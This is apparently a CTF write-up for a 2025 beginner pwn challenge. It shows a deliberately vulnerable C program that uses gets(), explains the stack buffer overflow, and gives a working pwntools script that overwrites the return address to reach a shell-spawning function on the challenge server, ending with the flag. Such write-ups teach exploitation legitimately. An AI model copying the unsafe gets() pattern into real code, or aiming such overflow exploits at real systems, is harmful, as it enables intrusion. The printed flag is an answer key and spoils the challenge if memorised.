---
title: clannad_is_g00d_anim3

published: 2025-07-08

description: gets() vulnerability to rop

tags: [pwn, C, gets, ROP]
category: No Hack No CTF 2025
---

# clannad_is_g00d_anim3 
> this is a easy pwn
> Clannad is a good anime 

## Files
```c title="chall.c"
char *gets(char *s);

int Clannad(){
  system("/bin/sh");
}

int vuln(){
  char buffer[64];
  printf("Welcome to the world of dango daikazoku\n");
  printf("enter a dango:");
  gets(buffer);
}

int main(){
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);

  vuln();
  printf("Hello\n");
  return 0;
}
```

## Vulnerability

Looking at our function `vuln` we can spot a common vulnerability, using the function `gets`. Using gets allows us to input more than 64 characters which will overwrite the return address. This now lets use jump to any function like `Clannad` which gives us a shell

## Exploit

```python
from pwn import *

payload = b'A'*72
payload += p64(0x4011bb)
p = remote('chal.78727867.xyz', 9999)
p.sendline(payload)
p.interactive()
```

First we send enough A to fill up the buffer and a little more

We can find out how many by sending `pwn cyclic` to the binary and seeing in gdb where we end up and then looking up that value

Then we get the address of `Clannad` using either gdb or objdump, which is `0x4011bb` and send that so it becomes our return address

Then we just use the interactive shell and find our flag: `NHNC{CLANNAD_1s_g00d_anim3_and_you_kn0w_BOF}`

## Conclusion

Don't use gets. The compiler literally tells you not to
